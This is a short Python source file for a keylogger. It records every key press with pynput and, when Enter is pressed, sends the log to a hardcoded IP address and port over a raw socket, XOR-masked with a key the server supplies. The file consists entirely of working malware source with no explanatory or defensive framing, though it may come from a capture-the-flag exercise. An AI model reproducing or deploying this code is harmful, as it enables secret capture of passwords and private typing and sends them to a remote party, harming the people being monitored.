
from pynput.keyboard import Listener
import socket
from Crypto.Util.number import bytes_to_long, long_to_bytes
import base64
class Keylogger:
    IP_ADDRESS = "169.254.236.147"
    PORT = 31678
    def __init__(self):
        self.log = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    def on_press(self, key):
        if (str(key) == 'Key.enter'):
            print("Sending log report.")
            self.send_report()    
        else:
            if len(str(key)) == 3:
                self.log += str(key)[1] + " "
            else:
                self.log += str(key) + " "
    def send_report(self):
        self.socket.send(str((len(bin(bytes_to_long(self.log.encode()))) - 2)).encode())
        key = int(base64.b64decode(self.socket.recv(9192)).decode())
        self.log = long_to_bytes(bytes_to_long(self.log.encode()) ^ key)
        self.socket.send(self.log)
        self.log = ""
    def start(self):
        self.socket.connect((self.IP_ADDRESS, self.PORT))
        with Listener(on_press = self.on_press) as listener:
            listener.join()
if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()

